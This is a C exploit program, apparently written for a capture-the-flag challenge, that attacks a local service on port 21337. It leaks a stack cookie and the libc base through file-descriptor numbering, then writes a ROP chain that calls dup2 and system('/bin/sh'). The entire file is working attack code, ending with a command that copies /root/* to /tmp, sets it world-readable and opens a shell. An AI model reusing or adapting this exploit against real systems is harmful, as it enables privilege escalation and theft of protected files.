#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>

#define PORT 21337

volatile unsigned long long penis = 0;
struct sockaddr_in serv_addr; 
pthread_cond_t cond1 = PTHREAD_COND_INITIALIZER;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

int create_connection() {
    int sock = 0, valread; 
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    } 
       
    // Convert IPv4 and IPv6 addresses from text to binary form 
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)  
    { 
        printf("\nInvalid address/ Address not supported \n"); 
        return -1; 
    } 

    return sock;
    // write(sock , hello , strlen(hello));
    // printf("Hello message sent\n"); 
    // valread = read( sock , buffer, 1024); 
    // printf("Res: %s\n",buffer ); 
    // return sock; 
}

void do_connect(int fd) {
	connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	
	// if (fcntl(fd, F_SETFL, O_NONBLOCK) != 0) {
 //      err(1, "fcntl");
 //    }
}

void* wait_for_connect(void* fd) {
	pthread_mutex_lock(&lock); 
	pthread_cond_wait(&cond1, &lock); 
	pthread_mutex_unlock(&lock);
	connect((int)fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	printf("Connected %d\n", fd);
}

void* clog_lmao() {
	while (1) {
		penis += 1;
	}
}

void do_clog() {
	pthread_t dick[4];
	struct sched_param params;
	params.sched_priority = sched_get_priority_max(SCHED_FIFO);
	for (int i = 0; i < 4; i++) {
	if (pthread_create(&dick[i], NULL, &clog_lmao, 0) != 0) {
	  printf("Uh-oh!\n");
     }
     pthread_setschedparam(dick[i], SCHED_FIFO, &params);
	 }
}

int main() {
	// do_clog();
	sleep(1);
	char* msg = "exit\n";
	serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
	int fds[2000];
	char buffer[1025];
	int fd_pad = 1024 + 4 + 7*8;
	for (int i = 0; i < fd_pad; i++) {
		fds[i] = create_connection();
		// printf("Fd: %d\n", fds[i]);
	}
	for (int i = 0; i < fd_pad; ++i) {
		do_connect(fds[i]);
	}
	int number;
	char* temp = "a\n";
	// write(fds[fd_pad - 1], temp, 2);
	// sleep(1);
	// read(fds[fd_pad - 1], buffer, 1024);
	// buffer[13] = 0;
	// number = atoi(buffer + 8);
	// int fd_base = number + 1;
	int fd_base = 1088;
	// printf("FD BASE:%d\n", fd_base);

	// cookie leak
	int cookie_fd[64];
	for (int i = 0; i < 64; i++) {
		cookie_fd[i] = create_connection();
		// printf("Cookie Fd: %d\n", cookie_fd[i]);
	}
	// for (int i = 0; i < 64; i++) {
	// 	printf("Connect %d\n", i);
	// 	connect(cookie_fd[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	// 	// do_connect(cookie_fd[i]);
	// 	// write(cookie_fd[i], temp, 2);
	// }
	// sleep(1);

	pthread_t threads[64];
	for (int i = 0; i < 64; i++) {
		// if (pthread_create(&threads[i], NULL, &wait_for_connect, (void *)cookie_fd[i]) != 0) {
	 //        printf("Uh-oh!\n");
	 //        return -1;
	 //    }
		// do_connect(cookie_fd[i]);
		connect(cookie_fd[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	}

	// sleep(1);
	// pthread_mutex_lock(&lock);
	// pthread_cond_broadcast(&cond1);
	// pthread_mutex_unlock(&lock);
	// sleep(1);

	// for (int i = 0; i < 64; i++) {
	// 	pthread_join(threads[i], NULL);
	// }

	unsigned long long leak = 0;
	unsigned long long cookie_leak = 0;
	unsigned long long libc_leak = 0;
	unsigned long long stack_leak = 0;

	struct pollfd pfd_read;
	// get cookie leak
	for (int i = 0; i < 64; i++) {
		// printf("leak %d\n", i);
		pfd_read.fd = cookie_fd[i];
		pfd_read.events = POLLIN;
		int timeout = 25;
		if (poll(&pfd_read, 1, timeout) != 1) {
			// printf("Read error %d\n", i);
		} else {
			// printf("Read good %d\n", i);
			int bytes_read = read(cookie_fd[i], buffer, 1024);
			if (bytes_read > 0) {
				buffer[bytes_read] = 0;
				buffer[13] = 0;
				// printf("Result: %s\n", buffer);
				int number = atoi(buffer + 8);
				// printf("Number: %d\n", number);
				long long temp = number - fd_base;
				unsigned long long add = 1;
				for (int j = 0; j < number - fd_base; j++) {
					add *= 2;
				}
				leak = leak | add;
				// printf("BIT %d\n", number - fd_base);
			}
		}
	}
	cookie_leak = leak;
	printf("Cookie leak %llx\n", cookie_leak);

	int ropchain_pad[0x38 * 8];
	fd_pad = 0x38 * 8;
	for (int i = 0; i < 0x38 * 8; i++) {
		ropchain_pad[i] = create_connection();
		connect(ropchain_pad[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
		// do_connect(ropchain_pad[i]);
	}

	// fd_base = 1600 - 64*3;
	// int stack_fd[64];
	// for (int i = 0; i < 64; i++) {
	// 	stack_fd[i] = create_connection();
	// }

	// for (int i = 0; i < 64; i++) {
	// 	connect(stack_fd[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	// 	// do_connect(stack_fd[i]);
	// }

	// // write(ropchain_pad[fd_pad - 1], temp, 2);
	// // sleep(1);
	// // read(ropchain_pad[fd_pad - 1], buffer, 1024);
	// // buffer[13] = 0;
	// // number = atoi(buffer + 8);
	// // fd_base = number + 1;

	// // cookie leak


	// leak = 0;
	// for (int i = 0; i < 64; i++) {
	// 	// printf("leak %d\n", i);
	// 	pfd_read.fd = stack_fd[i];
	// 	pfd_read.events = POLLIN;
	// 	int timeout = 25;
	// 	if (poll(&pfd_read, 1, timeout) != 1) {
	// 		// printf("Read error %d\n", i);
	// 	} else {
	// 		// printf("Read good %d\n", i);
	// 		int bytes_read = read(stack_fd[i], buffer, 1024);
	// 		if (bytes_read > 0) {
	// 			buffer[bytes_read] = 0;
	// 			buffer[13] = 0;
	// 			// printf("Result: %s\n", buffer);
	// 			int number = atoi(buffer + 8);
	// 			// printf("Number: %d\n", number);
	// 			long long temp = number - fd_base;
	// 			unsigned long long add = 1;
	// 			for (int j = 0; j < number - fd_base; j++) {
	// 				add *= 2;
	// 			}
	// 			leak = leak | add;
	// 			// printf("BIT %d\n", number - fd_base);
	// 		}
	// 	}
	// }
	// stack_leak = leak - 0xc8;
	// //REPLACEME
	// printf("Stack leak: %llx\n", stack_leak);

	// int ropchain_pad2[0x10 * 8];
	// fd_pad = 0x10 * 8;
	// for (int i = 0; i < 0x10 * 8; i++) {
	// 	ropchain_pad2[i] = create_connection();
	// 	// do_connect(ropchain_pad2[i]);
	// 	connect(ropchain_pad2[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	// }

	// sleep(1);
	// pthread_mutex_lock(&lock);
	// pthread_cond_broadcast(&cond1);
	// pthread_mutex_unlock(&lock);
	// sleep(1);

	// for (int i = 0; i < 64; i++) {
	// 	pthread_join(threads[i], NULL);
	// }
	fd_base = 1600;
	// printf("FD BASE:%d\n", fd_base);

	int libc_fd[64];
	for (int i = 0; i < 64; i++) {
		libc_fd[i] = create_connection();
	}

	for (int i = 0; i < 64; i++) {
		// if (pthread_create(&threads[i], NULL, &wait_for_connect, (void *)libc_fd[i]) != 0) {
	 //        printf("Uh-oh!\n");
	 //        return -1;
	 //    }
		connect(libc_fd[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
		// do_connect(libc_fd[i]);
	}

	int roplength = 8;
	int actual_ropchain_fd[roplength * 8 * 8];
	for (int i = 0; i < roplength * 8 * 8; i++) {
		actual_ropchain_fd[i] = 0;
	}

	leak = 0;
	for (int i = 0; i < 64; i++) {
		// printf("leak %d\n", i);
		pfd_read.fd = libc_fd[i];
		pfd_read.events = POLLIN;
		int timeout = 25;
		if (poll(&pfd_read, 1, timeout) != 1) {
			// printf("Read error %d\n", i);
		} else {
			// printf("Read good %d\n", i);
			int bytes_read = read(libc_fd[i], buffer, 1024);
			if (bytes_read > 0) {
				buffer[bytes_read] = 0;
				buffer[13] = 0;
				// printf("Result: %s\n", buffer);
				int number = atoi(buffer + 8);
				// printf("Number: %d\n", number);
				long long temp = number - fd_base;
				actual_ropchain_fd[number - fd_base] = libc_fd[i];
				unsigned long long add = 1;
				for (int j = 0; j < number - fd_base; j++) {
					add *= 2;
				}
				leak = leak | add;
				// printf("BIT %d\n", number - fd_base);
				libc_fd[i] = 0;
			}
		}
	}
	libc_leak = leak - 0x270b3;
	// libc_leak = leak - 0x21b97;
	printf("Libc leak %llx\n", libc_leak);

	unsigned long long binsh = 0x1b75af + libc_leak;
	unsigned long long poprdi = 0x000000000002f71f + libc_leak;
	unsigned long long system_ptr = 0x55410 + libc_leak;
	// unsigned long long binsh = 0x1b40fa + libc_leak;
	// unsigned long long poprdi = 0x000000000002155f + libc_leak;
	// unsigned long long system = 0x4f4e0 + libc_leak;

	
	for (int i = 64; i < roplength * 8 * 8; i++) {
		actual_ropchain_fd[i] = create_connection();
		// setsockopt(actual_ropchain_fd[i], SOL_SOCKET, SO_RCVBUF, 0x0, sizeof(int));
		// setsockopt(actual_ropchain_fd[i], SOL_SOCKET, SO_SNDBUF, 0x0, sizeof(int));
		// write(actual_ropchain_fd[i], temp, 2);
		// buffer[read(actual_ropchain_fd[i], buffer, 1024)] = 0;
	}


	for (int i = 64; i < roplength * 8 * 8; i++) {
		connect(actual_ropchain_fd[i], (struct sockaddr *)&serv_addr, sizeof(serv_addr));
		// if (fcntl(actual_ropchain_fd[i], F_SETFL, O_NONBLOCK) != 0) {
	 //      err(1, "fcntl");
	 //    }
		// do_connect(actual_ropchain_fd[i]);
	}
	// put fds in order
	// temp = "b\n";
	// for (int i = 0; i < 64; i++) {
	// 	if (libc_fd[i])
	// 		write(libc_fd[i], temp, 2);
	// }
	// sleep(1);
	// for (int i = 0; i < 64; i++) {
	// 	if (!libc_fd[i])
	// 		continue;
	// 	printf("Do ropchain sice lmao %d\n", i);
	// 	read(libc_fd[i], buffer, 1024);
	// 	printf("%s", buffer);
	// 	buffer[13] = 0;
	// 	number = atoi(buffer + 8);
	// 	int bitno = number - fd_base;
	// 	if (bitno >= 64 || bitno < 0) {
	// 		printf("FUCKED");
	// 		return -1;
	// 	}
	// 	actual_ropchain_fd[bitno] = libc_fd[i];
	// }
	for (int i = 0; i < 64; i++) {
		if (libc_fd[i])
			actual_ropchain_fd[i] = libc_fd[i];
	}

	// why the fuck won't this block select

	int count = 0;
	// for (int i = 0; i < 3 * 64; i++) {
	for (int i = roplength * 64 - 1; i >= 0; i--) {
		// printf("close %d\n", actual_ropchain_fd[i]);
		shutdown(actual_ropchain_fd[i], SHUT_RDWR);
		// close(actual_ropchain_fd[i]);
		usleep(10000);
	}
	// // for (int i = 0; i < 0x38 * 8; i++) {
	// for (int i = 0x38 * 8 - 1; i >= 0; i--) {
	// 	printf("close %d\n", ropchain_pad[i]);
	// 	shutdown(ropchain_pad[i], SHUT_RDWR);
	// 	// close(ropchain_pad[i]);
	// 	usleep(20000);
	// 	count += 1;
	// }
	// // for (int i = 0; i < 64; i++) {
	// for (int i = 64 - 1; i >= 0; i--) {
	// 	printf("close %d\n", cookie_fd[i]);
	// 	// close(cookie_fd[i]);
	// 	shutdown(cookie_fd[i], SHUT_RDWR);
	// 	usleep(20000);
	// 	count += 1;
	// }
	// printf("length %d\n", roplength * 64 - 1);
	for (int i = roplength * 64 - 1; i >= 0; i--) {
		// printf("close2 %d %d\n", actual_ropchain_fd[i], i);
		close(actual_ropchain_fd[i]);
		// close(actual_ropchain_fd[i]);
	}
	// // for (int i = 0; i < 0x38 * 8; i++) {
	// for (int i = 0x38 * 8 - 1; i >= 0; i--) {
	// 	printf("close %d\n", ropchain_pad[i]);
	// 	close(ropchain_pad[i]);
	// 	// close(ropchain_pad[i]);
	// 	// usleep(20000);
	// }
	// // for (int i = 0; i < 64; i++) {
	// for (int i = 64 - 1; i >= 0; i--) {
	// 	printf("close %d\n", cookie_fd[i]);
	// 	// close(cookie_fd[i]);
	// 	close(cookie_fd[i]);
	// 	// usleep(20000);
	// }

	unsigned long long dup2 = 0x1118a0 + libc_leak;
	unsigned long long ropchain[roplength];
	unsigned long long poprsi = 0x0000000000027529 + libc_leak;
	ropchain[0] = poprdi;
	ropchain[1] = 4;
	ropchain[2] = poprsi;
	ropchain[3] = 0;
	ropchain[4] = dup2;
	ropchain[5] = poprdi;
	ropchain[6] = binsh;
	ropchain[7] = system_ptr;
	// ropchain[7] = system_ptr;
	// memcpy((char*)(&ropchain[4]), "chmod +x /tmp/a;/tmp/a\x00", 23);

	// ropchain[3] = 0x444444444444;
	printf("ROPSICE");
	fflush(stdout);
	for (int i = 0; i < roplength; i++) {
		// printf("writing %d\n", i);
		// fflush(stdout);
		for (int j = 0; j < 8 * 8; j++) {
			// printf("bit %d\n", j);
			// fflush(stdout);
			int idx = i * 64 + j;
			actual_ropchain_fd[idx] = create_connection();
			do_connect(actual_ropchain_fd[idx]);
			// printf("Create %d\n", actual_ropchain_fd[idx]);
			unsigned long long mask = 1;
			for (int k = 0; k < j; k++) {
				mask = mask * 2;
			}
			if (mask & ropchain[i]) {
				// printf("do write\n");
				// fflush(stdout);
				write(actual_ropchain_fd[idx], temp, 2);
				// printf("do read\n");
				// fflush(stdout);
				// int r = read(actual_ropchain_fd[idx], buffer, 1024);
				// if (r)
					// printf("%s\n", buffer);
			}
		}
	}
	// system("echo 'touch /tmp/b; cp /root/* /tmp; chmod 777 /tmp/*' > /tmp/a");
	char* cmd = "`cp /root/* /tmp; chmod 777 /tmp/*`\n";
	sleep(1);
	printf("Trigger binsh");
	write(5, msg, strlen(msg));
	printf("DONE\n");
	for (int i = 0; i < 5; i++) {
		printf("do cmd %d\n", i);
		write(3, cmd, strlen(cmd));
		sleep(1);
	}
	fflush(stdout);
	system("/bin/ls -la /tmp; /bin/sh");
}